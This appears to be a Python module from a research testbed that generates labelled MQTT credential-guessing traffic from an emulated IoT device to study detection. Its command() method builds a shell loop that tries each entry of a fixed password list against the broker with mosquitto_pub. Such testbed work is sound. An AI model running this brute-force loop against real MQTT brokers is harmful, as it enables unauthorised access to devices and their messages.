"""Attack family F2: MQTT credential guessing (E1-09; ADR-0003).

A compromised IoT device D guesses broker credentials: it opens one CONNECT per guess from a
fixed list, each with a wrong password, so the broker refuses and logs it. The attack runs in
D's own emulator container, so the traffic keys to D (record §4.1). Tool: `mosquitto_pub`
(one refused CONNECT per guess). Needs broker authentication, which is on (ADR-0003, E1-05).
Expected sources: mqtt (the broker's refused-auth log) and flows.

The guess list is `scenarios/mqtt_credentials.txt`, committed and fixed (ADR-0003). Bounded by
the list, so the attack finishes within the episode and exits 0.
"""

from __future__ import annotations

from pathlib import Path
from typing import Final

from thesis.scenario.families.base import DEVICE_SERVICE, ContainerAttackRunner
from thesis.scenario.schedule import AttackFamily, Episode

REPO_ROOT: Final = Path(__file__).resolve().parent.parent.parent.parent
CREDENTIALS: Final = REPO_ROOT / "scenarios" / "mqtt_credentials.txt"
ATTEMPT_INTERVAL_S: Final = 0.3  # fixed attempt rate
CLIENT_SUFFIX: Final = "brute"  # D's client id for the attack: <device>-brute


def load_guesses(path: Path = CREDENTIALS) -> list[tuple[str, str]]:
    guesses = []
    for line in path.read_text(encoding="utf-8").splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        user, _, password = line.partition(":")
        guesses.append((user, password))
    return guesses


class MqttBruteForceRunner(ContainerAttackRunner):
    family = AttackFamily.MQTT_BRUTE_FORCE

    def service_for(self, episode: Episode) -> str:
        return DEVICE_SERVICE[episode.target_device]

    def command(self, episode: Episode) -> str:
        interval = float(episode.parameters.get("interval_s", ATTEMPT_INTERVAL_S))
        client = f"{episode.target_device}-{CLIENT_SUFFIX}"
        # One refused CONNECT per guess, at a fixed rate. The guesses are inlined from the
        # committed list so no file needs mounting into the container.
        attempts = " ".join(f"'{u}///{p}'" for u, p in load_guesses())
        return (
            f"for cp in {attempts}; do "
            f"u=${{cp%%///*}}; p=${{cp##*///}}; "
            f'mosquitto_pub -h broker -u "$u" -P "$p" -i {client} '
            f"-t iot/{episode.target_device}/probe -m x >/dev/null 2>&1; "
            f"sleep {interval}; done"
        )
